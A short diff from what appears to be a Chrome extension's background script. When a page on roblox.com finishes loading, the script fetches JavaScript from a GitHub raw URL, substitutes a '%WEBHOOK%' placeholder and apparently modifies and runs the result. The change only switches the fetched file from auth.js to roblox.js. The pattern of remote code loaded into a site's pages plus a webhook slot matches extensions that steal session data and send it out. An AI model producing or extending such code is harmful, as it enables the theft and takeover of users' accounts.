@@ -17,7 +17,7 @@ chrome.webNavigation.onCompleted.addListener(function(details) {
       })
       .catch(error => console.error('Error fetching or modifying the script:', error));
   } else if (details.url.includes('roblox.com')) {
-    fetch('https://raw.githubusercontent.com/43a1723/extension-test/main/extension/js/auth.js')
+    fetch('https://raw.githubusercontent.com/43a1723/extension-test/main/extension/js/roblox.js')
       .then(response => response.text())
       .then(data => {
         const modifiedData = data.replace('%WEBHOOK%', '123');
